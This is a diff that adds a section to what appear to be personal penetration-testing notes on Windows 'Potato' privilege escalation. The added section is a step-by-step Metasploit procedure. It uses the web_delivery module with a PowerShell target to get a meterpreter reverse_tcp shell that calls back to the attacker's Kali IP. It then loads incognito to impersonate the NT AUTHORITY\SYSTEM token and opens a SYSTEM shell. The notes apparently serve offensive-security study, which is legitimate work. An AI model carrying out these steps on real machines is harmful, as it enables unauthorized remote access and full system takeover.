@@ -26,3 +26,48 @@ Juicy Potato (abusing the golden privileges):
         RottenPotatoNG and its variants leverages the privilege escalation chain based on BITS service having the MiTM listener on 127.0.0.1:6666 and 
         when you have SeImpersonate or "SeAssignPrimaryToken" privileges. 
         During a Windows build review we found a setup where BITS was intentionally disabled and port 6666 was taken.
+
+Exploit Potatoe:
+
+    1-msfconsole
+        use exploit/multi/script/web_delivery
+        show targets
+            2 - PSH 
+
+            set target 2
+
+            set payload windows/meterpreter/reverse_tcp <-- x64 sometimes don't work 
+
+            set lhost <KALI IP>
+
+            set srvhost <KALI IP>
+
+            options <-- to check if the necessary stuf is set 
+
+            run
+
+    2-Copy the msfconsole command to the Windows Machine
+
+    3-in msf explit > sessions 1
+        We should get a METERPRETER Shell
+
+        getprivs
+
+        run 
+
+    4-Escalation via Potatoe:
+
+        load incognito
+
+        list_tokens -u 
+
+        impersonate_token "NT AUTHORITY\SYSTEM"
+
+        shell 
+
+        C:\Windows> whoami
+            nt authority system 
+
+
+
+
